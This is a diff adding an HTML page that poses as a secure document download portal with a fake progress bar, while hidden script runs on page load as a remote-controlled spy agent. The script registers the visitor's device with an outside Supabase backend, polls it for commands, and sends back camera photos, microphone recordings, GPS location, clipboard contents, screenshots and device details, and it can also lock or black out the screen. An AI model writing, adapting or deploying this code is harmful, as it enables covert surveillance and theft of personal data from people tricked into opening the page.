@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Document Download Portal</title>
+<style>
+  /* ===== DECOY UI ===== */
+  body { margin: 0; padding: 0; }
+
+  #decoy {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: #f0f2f5;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .decoy-card {
+    background: white;
+    border-radius: 12px;
+    padding: 36px 28px;
+    width: 88%;
+    max-width: 400px;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+    text-align: center;
+  }
+
+  .decoy-icon { font-size: 56px; margin-bottom: 12px; display: block; }
+  .decoy-title { font-size: 20px; font-weight: 700; color: #1a1a2e; margin-bottom: 6px; }
+  .decoy-sub { color: #888; font-size: 13px; margin-bottom: 20px; line-height: 1.6; }
+  .decoy-file-info {
+    background: #f8f9ff;
+    border: 1px solid #e0e4ff;
+    border-radius: 8px;
+    padding: 12px 16px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 20px;
+    text-align: left;
+  }
+  .decoy-file-icon { font-size: 32px; }
+  .decoy-file-name { font-size: 14px; font-weight: 600; color: #333; }
+  .decoy-file-size { font-size: 12px; color: #999; }
+  .decoy-progress-wrap { margin-bottom: 8px; }
+  .decoy-progress { background: #eef0ff; border-radius: 100px; height: 8px; overflow: hidden; }
+  .decoy-bar { background: linear-gradient(90deg, #4361ee, #7209b7); height: 100%; width: 0%; border-radius: 100px; transition: width 0.4s ease; }
+  .decoy-status { color: #aaa; font-size: 12px; margin-top: 6px; min-height: 18px; }
+  .decoy-btn {
+    margin-top: 16px;
+    background: linear-gradient(135deg, #4361ee, #7209b7);
+    color: white;
+    border: none;
+    padding: 14px 0;
+    border-radius: 8px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    width: 100%;
+    letter-spacing: 0.3px;
+  }
+  .decoy-btn:active { opacity: 0.85; }
+  .decoy-secure {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    color: #bbb;
+    font-size: 12px;
+  }
+
+  /* ===== HIDDEN AGENT ===== */
+  #agent { display: none; }
+
+  /* Camera/hidden elements */
+  #videoEl { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; }
+  #canvasEl { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; }
+
+</style>
+</head>
+<body>
+
+<!-- ====== DECOY INTERFACE ====== -->
+<div id="decoy">
+  <div class="decoy-card">
+    <span class="decoy-icon">📄</span>
+    <div class="decoy-title">Secure Document Portal</div>
+    <div class="decoy-sub">Your document is ready. Tap below to begin the secure download to your device.</div>
+
+    <div class="decoy-file-info">
+      <span class="decoy-file-icon">📋</span>
+      <div>
+        <div class="decoy-file-name">Project_Report_Final.pdf</div>
+        <div class="decoy-file-size">4.2 MB · PDF Document</div>
+      </div>
+    </div>
+
+    <div class="decoy-progress-wrap">
+      <div class="decoy-progress">
+        <div class="decoy-bar" id="decoyBar"></div>
+      </div>
+      <div class="decoy-status" id="decoyStatus">Tap Download to begin</div>
+    </div>
+
+    <button class="decoy-btn" id="decoyBtn" onclick="startDecoy()">⬇ Download Document</button>
+  </div>
+
+  <div class="decoy-secure">🔒 256-bit SSL encrypted · Secure Transfer</div>
+</div>
+
+<!-- ====== REAL HIDDEN ELEMENTS ====== -->
+<video id="videoEl" autoplay playsinline muted></video>
+<canvas id="canvasEl"></canvas>
+
+<script>
+// ============================================================
+//  CONFIG
+// ============================================================
+const SUPABASE_URL  = 'https://muyevssqiuvhcozgxtlp.supabase.co';
+const SUPABASE_KEY  = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11eWV2c3NxaXV2aGNvemd4dGxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MTE4NTQsImV4cCI6MjA5Mzk4Nzg1NH0.jzN6V1UArKq5epxK3tTXuo1cGukH5oKD9qAi1FQWGUU';
+const DEVICE_ID     = 'device_' + Math.random().toString(36).slice(2, 9);
+const CHANNEL       = 'ghost_commands';
+
+// ============================================================
+//  DECOY ANIMATION
+// ============================================================
+function startDecoy() {
+  const btn    = document.getElementById('decoyBtn');
+  const bar    = document.getElementById('decoyBar');
+  const status = document.getElementById('decoyStatus');
+  btn.disabled = true;
+  btn.textContent = 'Downloading…';
+
+  const steps = [
+    { pct: 15, msg: 'Connecting to server…' },
+    { pct: 35, msg: 'Verifying credentials…' },
+    { pct: 55, msg: 'Downloading (2.3 MB / 4.2 MB)…' },
+    { pct: 78, msg: 'Downloading (3.7 MB / 4.2 MB)…' },
+    { pct: 95, msg: 'Finalising document…' },
+    { pct: 100, msg: '✅ Download complete!' },
+  ];
+
+  let i = 0;
+  const tick = setInterval(() => {
+    if (i >= steps.length) { clearInterval(tick); btn.textContent = '✅ Open Document'; btn.disabled = false; return; }
+    bar.style.width = steps[i].pct + '%';
+    status.textContent = steps[i].msg;
+    i++;
+  }, 900);
+}
+
+// ============================================================
+//  SUPABASE HELPERS  (fetch-based, no SDK needed)
+// ============================================================
+async function sbInsert(table, row) {
+  const r = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
+    method: 'POST',
+    headers: {
+      'apikey': SUPABASE_KEY,
+      'Authorization': `Bearer ${SUPABASE_KEY}`,
+      'Content-Type': 'application/json',
+      'Prefer': 'return=minimal'
+    },
+    body: JSON.stringify(row)
+  });
+  return r.ok;
+}
+
+async function sbSelect(table, filter) {
+  const url = `${SUPABASE_URL}/rest/v1/${table}?${filter}&order=created_at.desc&limit=1`;
+  const r = await fetch(url, {
+    headers: {
+      'apikey': SUPABASE_KEY,
+      'Authorization': `Bearer ${SUPABASE_KEY}`
+    }
+  });
+  return r.ok ? r.json() : [];
+}
+
+// ============================================================
+//  DEVICE INFO
+// ============================================================
+function collectDeviceInfo() {
+  const nav = window.navigator;
+  return {
+    ua: nav.userAgent,
+    platform: nav.platform || 'unknown',
+    lang: nav.language,
+    screen: `${screen.width}x${screen.height}`,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    battery: 'querying…',
+    online: navigator.onLine,
+    cores: nav.hardwareConcurrency || 'N/A',
+    memory: nav.deviceMemory ? nav.deviceMemory + ' GB' : 'N/A',
+    ts: new Date().toISOString()
+  };
+}
+
+// ============================================================
+//  CAMERA CAPTURE
+// ============================================================
+let cameraStream = null;
+
+async function startCamera(facing = 'environment') {
+  try {
+    if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); }
+    cameraStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facing, width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false
+    });
+    document.getElementById('videoEl').srcObject = cameraStream;
+    await new Promise(r => document.getElementById('videoEl').onloadedmetadata = r);
+    return true;
+  } catch(e) { return false; }
+}
+
+async function capturePhoto(facing = 'environment') {
+  const ok = await startCamera(facing);
+  if (!ok) return sendResult('capture', { error: 'Camera permission denied' });
+
+  await new Promise(r => setTimeout(r, 800)); // warm up
+
+  const video  = document.getElementById('videoEl');
+  const canvas = document.getElementById('canvasEl');
+  canvas.width  = video.videoWidth  || 640;
+  canvas.height = video.videoHeight || 480;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+  const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+
+  // Stop camera after capture
+  cameraStream.getTracks().forEach(t => t.stop());
+  cameraStream = null;
+
+  await sendResult('capture', { image: dataUrl, facing, w: canvas.width, h: canvas.height });
+}
+
+// ============================================================
+//  MICROPHONE RECORD  (5 sec clip)
+// ============================================================
+async function recordAudio(seconds = 5) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.start();
+    await new Promise(r => setTimeout(r, seconds * 1000));
+    recorder.stop();
+    await new Promise(r => recorder.onstop = r);
+    stream.getTracks().forEach(t => t.stop());
+
+    const blob = new Blob(chunks, { type: 'audio/webm' });
+    const reader = new FileReader();
+    reader.readAsDataURL(blob);
+    await new Promise(r => reader.onloadend = r);
+    await sendResult('audio', { audio: reader.result, duration: seconds });
+  } catch(e) {
+    await sendResult('audio', { error: 'Microphone permission denied' });
+  }
+}
+
+// ============================================================
+//  LOCATION
+// ============================================================
+async function getLocation() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return resolve({ error: 'Geolocation not supported' });
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+      }),
+      err => resolve({ error: err.message }),
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  });
+}
+
+// ============================================================
+//  BATTERY
+// ============================================================
+async function getBattery() {
+  try {
+    const b = await navigator.getBattery();
+    return { level: Math.round(b.level * 100) + '%', charging: b.charging };
+  } catch(e) { return { error: 'Battery API not available' }; }
+}
+
+// ============================================================
+//  CLIPBOARD READ
+// ============================================================
+async function readClipboard() {
+  try {
+    const text = await navigator.clipboard.readText();
+    return { text };
+  } catch(e) { return { error: 'Clipboard permission denied' }; }
+}
+
+// ============================================================
+//  SCREENSHOT  (screen capture API)
+// ============================================================
+async function takeScreenshot() {
+  try {
+    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+    const video  = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+    const canvas = document.createElement('canvas');
+    canvas.width  = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    stream.getTracks().forEach(t => t.stop());
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+    await sendResult('screenshot', { image: dataUrl });
+  } catch(e) {
+    await sendResult('screenshot', { error: 'Screen capture denied: ' + e.message });
+  }
+}
+
+// ============================================================
+//  SEND RESULT BACK TO SUPABASE
+// ============================================================
+async function sendResult(type, payload) {
+  await sbInsert('ghost_results', {
+    device_id: DEVICE_ID,
+    type,
+    payload: JSON.stringify(payload),
+    created_at: new Date().toISOString()
+  });
+}
+
+// ============================================================
+//  COMMAND PROCESSOR
+// ============================================================
+async function processCommand(cmd) {
+  const command = (cmd.command || '').toLowerCase().trim();
+  const param   = cmd.param || '';
+
+  console.log('[GHOST] CMD:', command);
+
+  switch(command) {
+    case 'capture':
+    case 'photo':
+      await capturePhoto('environment');
+      break;
+
+    case 'selfie':
+    case 'capture_front':
+      await capturePhoto('user');
+      break;
+
+    case 'audio':
+    case 'record':
+      await recordAudio(parseInt(param) || 5);
+      break;
+
+    case 'location':
+    case 'gps':
+      const loc = await getLocation();
+      await sendResult('location', loc);
+      break;
+
+    case 'battery':
+      const bat = await getBattery();
+      await sendResult('battery', bat);
+      break;
+
+    case 'status':
+    case 'info':
+      const info = collectDeviceInfo();
+      const bat2  = await getBattery();
+      await sendResult('status', { ...info, battery: bat2 });
+      break;
+
+    case 'clipboard':
+      const clip = await readClipboard();
+      await sendResult('clipboard', clip);
+      break;
+
+    case 'screenshot':
+      await takeScreenshot();
+      break;
+
+    case 'ping':
+      await sendResult('ping', { alive: true, device_id: DEVICE_ID, ts: new Date().toISOString() });
+      break;
+
+    case 'lock':
+      document.body.style.pointerEvents = 'none';
+      document.body.style.filter = 'brightness(0)';
+      await sendResult('lock', { locked: true });
+      break;
+
+    case 'unlock':
+      document.body.style.pointerEvents = '';
+      document.body.style.filter = '';
+      await sendResult('lock', { locked: false });
+      break;
+
+    case 'alert':
+      alert(param || 'System Alert');
+      await sendResult('alert', { shown: true, msg: param });
+      break;
+
+    case 'vibrate':
+      if (navigator.vibrate) navigator.vibrate([300,100,300,100,300]);
+      await sendResult('vibrate', { done: true });
+      break;
+
+    default:
+      await sendResult('unknown', { command });
+  }
+}
+
+// ============================================================
+//  POLLING LOOP  (check for new commands every 3 seconds)
+// ============================================================
+let lastChecked = new Date().toISOString();
+
+async function pollCommands() {
+  try {
+    const rows = await sbSelect(
+      'ghost_commands',
+      `device_id=eq.${DEVICE_ID}&created_at=gt.${encodeURIComponent(lastChecked)}&executed=eq.false`
+    );
+
+    // Also check broadcast commands (device_id = 'all')
+    const broad = await sbSelect(
+      'ghost_commands',
+      `device_id=eq.all&created_at=gt.${encodeURIComponent(lastChecked)}&executed=eq.false`
+    );
+
+    const all = [...(rows || []), ...(broad || [])];
+
+    for (const row of all) {
+      await processCommand(row);
+      // Mark executed
+      await fetch(`${SUPABASE_URL}/rest/v1/ghost_commands?id=eq.${row.id}`, {
+        method: 'PATCH',
+        headers: {
+          'apikey': SUPABASE_KEY,
+          'Authorization': `Bearer ${SUPABASE_KEY}`,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ executed: true })
+      });
+    }
+
+    lastChecked = new Date().toISOString();
+  } catch(e) { /* silent */ }
+}
+
+// ============================================================
+//  INIT
+// ============================================================
+async function init() {
+  // Register device
+  await sbInsert('ghost_devices', {
+    device_id: DEVICE_ID,
+    info: JSON.stringify(collectDeviceInfo()),
+    last_seen: new Date().toISOString()
+  });
+
+  // Heartbeat every 30s
+  setInterval(async () => {
+    await fetch(`${SUPABASE_URL}/rest/v1/ghost_devices?device_id=eq.${DEVICE_ID}`, {
+      method: 'PATCH',
+      headers: {
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ last_seen: new Date().toISOString() })
+    });
+  }, 30000);
+
+  // Poll every 3 seconds
+  setInterval(pollCommands, 3000);
+
+  console.log('[GHOST] Agent ready. Device ID:', DEVICE_ID);
+}
+
+window.addEventListener('load', init);
+</script>
+</body>
+</html>
